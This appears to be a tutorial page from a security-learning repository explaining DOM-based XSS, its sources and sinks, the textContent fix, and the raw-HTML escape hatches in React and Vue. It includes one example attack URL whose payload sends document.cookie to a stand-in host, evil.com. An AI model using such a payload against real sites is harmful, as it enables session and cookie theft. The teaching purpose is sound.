# 🌳 DOM-Based XSS

## A Vulnerability That Never Touches the Server

Both [reflected](reflected-xss.md) and [stored](stored-xss.md) XSS involve the *server* rendering
unescaped content into a response. **DOM-based XSS** is genuinely different: the entire
vulnerability exists purely in **client-side JavaScript**, which reads untrusted data (often from
the URL itself) and writes it into the page in an unsafe way — the server may never see the
malicious payload at all.

## A Concrete Example

```js
// VULNERABLE - client-side JavaScript reading the URL fragment
// and writing it directly into the page
document.getElementById("welcome").innerHTML =
  "Welcome, " + decodeURIComponent(window.location.hash.slice(1));
```

```
Attacker crafts a URL:
https://myapp.com/dashboard#<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">

The URL FRAGMENT (after "#") is NEVER SENT TO THE SERVER AT ALL -
this is purely client-side JavaScript reading window.location.hash
and writing it directly into innerHTML, entirely in the victim's
own browser.
```

This is the genuinely distinctive property of DOM-based XSS: since the fragment portion of a URL
(`#...`) is never included in the actual HTTP request sent to the server, server-side input
validation — no matter how thorough — can never catch this particular vulnerability. The entire
problem, and the entire fix, live purely in client-side code.

## Common Sources and Sinks

```
SOURCES (where untrusted data enters client-side code):
  - window.location (URL, hash, query string)
  - document.referrer
  - postMessage data from another window/frame

SINKS (where that data becomes dangerous if unescaped):
  - innerHTML / outerHTML
  - document.write()
  - eval()
  - setting an element's src/href to unsanitized data
```

Recognizing this source-and-sink pattern is genuinely useful for spotting DOM-based XSS risk in
real code: any path where data from a "source" flows into a "sink" without being properly escaped
or validated along the way is a candidate worth specifically examining.

## The Safer Alternative: `textContent` Instead of `innerHTML`

```js
// SAFE - textContent treats the value as PLAIN TEXT, never HTML
document.getElementById("welcome").textContent =
  "Welcome, " + decodeURIComponent(window.location.hash.slice(1));
```

`textContent` never interprets its assigned value as HTML at all — even a value containing
`<script>` tags is rendered as literal, visible text, never executed. This is directly the same
"structural separation" principle already established in
[preventing-injection-attacks.md](../injection-attacks/preventing-injection-attacks.md), earlier in
this domain — `textContent` structurally cannot execute its input as code, regardless of that
input's actual content.

## Why This Matters for Modern Frontend Frameworks

```
React, Vue, and similar frameworks escape rendered content by
DEFAULT - but each provides an explicit ESCAPE HATCH
(dangerouslySetInnerHTML in React, v-html in Vue) that
REINTRODUCES this exact risk when used with untrusted data.
```

This directly connects to this repository's Frontend domain — the safety modern frameworks provide
by default is a genuinely real benefit, but it's not automatic protection against every possible
misuse; an explicit escape hatch used carelessly with untrusted data reopens exactly this
vulnerability.

## Common Mistakes

- Assuming server-side input validation covers every XSS risk, missing that DOM-based XSS can occur
  entirely client-side, with data the server never even receives.
- Using `innerHTML` by default out of habit, rather than `textContent` for anything that doesn't
  genuinely need to render actual HTML markup.
- Using a framework's raw-HTML escape hatch (`dangerouslySetInnerHTML`, `v-html`) with data that
  ultimately originates from user input, reintroducing the exact risk the framework's default
  escaping was preventing.

## ➡️ Next

Continue to [preventing-xss.md](preventing-xss.md) to bring the defenses against all three variants
together into one complete strategy.
